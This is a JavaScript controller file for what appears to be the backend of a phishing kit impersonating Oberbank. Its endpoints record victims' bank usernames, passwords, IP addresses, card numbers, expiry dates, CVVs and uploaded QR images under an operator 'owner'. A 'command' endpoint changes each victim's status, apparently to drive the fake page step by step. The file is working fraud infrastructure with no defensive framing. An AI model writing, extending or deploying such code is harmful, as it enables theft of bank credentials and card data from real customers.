const Oberbank = require("../models/oberbankModel");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    Oberbank.find({ owner })
        .sort({ status: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await Oberbank.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    Oberbank.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip } = req.body;
    try {
        await Oberbank.create({
            uniqueid,
            username,
            password,
            status: 1,
            owner,
            ip,
        });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, password, uniqueid } = req.body;
    try {
        await Oberbank.findOneAndUpdate(
            { uniqueid },
            { username, password, status: 0 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitCard = async (req, res) => {
    const { ccnum, ccexp, cvv, uniqueid } = req.body;
    try {
        await Oberbank.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 6 }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitQr = async (req, res) => {
    if (!req.files) {
        return res.status(500).send({ msg: "file is not found" });
    }
    let { qr } = req.files;
    let { uniqueid } = req.body;
    const frontPath = `./oberbank/${uniqueid}_QR.jpg`;
    try {
        await qr.mv(frontPath, async (err) => {
            if (err) {
                console.log(err);
                return res.sendStatus(500);
            }
        });
        await Oberbank.findOneAndUpdate({ uniqueid }, { qr: true, status: 4 }).exec();
        res.sendStatus(200);
    } catch (e) {
        console.log(e)
        res.sendStatus(400);
    }
    // const { uniqueid } = req.body;
    // const frontPath = `./oberbank/${uniqueid}_QR.jpg`;
    // try {
    //     await Oberbank.findOneAndUpdate({ uniqueid }, { telephone, status: 2 }).exec();
    //     res.sendStatus(200);
    // } catch (error) {
    //     console.log(error);
    //     res.sendStatus(400);
    // }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await Oberbank.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getQr = async (req, res) => {
    const { uniqueid } = req.params;
    res.sendFile(`/oberbank/${uniqueid}_Back.jpg`, { root: '.' })
}

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitQr,
    submitCard,
    deleteEntry,
    getQr,
};
